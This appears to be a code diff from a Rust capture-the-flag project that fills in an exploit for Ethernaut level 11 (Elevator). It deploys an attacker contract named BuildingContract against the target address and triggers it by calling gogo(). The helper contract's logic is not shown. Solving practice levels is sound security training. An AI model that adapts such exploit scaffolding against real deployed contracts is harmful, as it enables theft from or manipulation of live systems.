@@ -1,5 +1,6 @@
+use crate::abi::building_contract::BuildingContract;
 use async_trait::async_trait;
-use ctf::ethernaut::lvlREPLACEME::*;
+use ctf::ethernaut::lvl11_elevator::*;
 use ethers::prelude::*;
 
 pub(crate) struct Exploit;
@@ -13,6 +14,11 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let hack_contract =
+            BuildingContract::deploy(offender.to_owned(), target.address)?
+                .send()
+                .await?;
+        hack_contract.gogo().send().await?;
         Ok(())
     }
 }
